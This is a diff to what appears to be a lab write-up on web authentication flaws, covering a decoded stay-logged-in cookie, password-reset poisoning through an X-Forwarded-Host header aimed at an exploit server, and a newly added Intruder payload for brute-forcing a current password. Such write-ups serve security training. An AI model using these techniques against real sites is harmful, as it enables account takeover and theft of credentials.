@@ -132,7 +132,7 @@ Look for an answer from carlos:
 ```
 GET /?secret=xHtfxrM68cuhFuEY30ETrSrX0eAp9hrR;%20stay-logged-in=Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz HTTP/1.1
 
-# stay loggen loggen in decode:
+# stay logged-in decode:
 carlos:26323c16d5f4dabff3bb136f2460a943
 ```
 
@@ -147,8 +147,12 @@ reset links for a host we control.
 1. Use Repeater for the `POST /forgot-password` request
 1. Set username to carlos
 1. Add `X-Forwarded-Host: exploit-0a2f00cd041f7e3f823151b001690060.exploit-server.net/exploit` Header
-1. Access the server log:
+1. View the server log:
         `GET /exploit/forgot-password?temp-forgot-password-token=SOEFGdL2dqdeCXu0xrqN2ndOQwXSGwnp HTTP/1.1`
 
 ## Password brute-force via password change
+
+If the two new passwords do not match, a different message is returned
+
+Intruder payload: `username=carlos&current-password=§peter§&new-password-1=blu&new-password-2=bla`
 
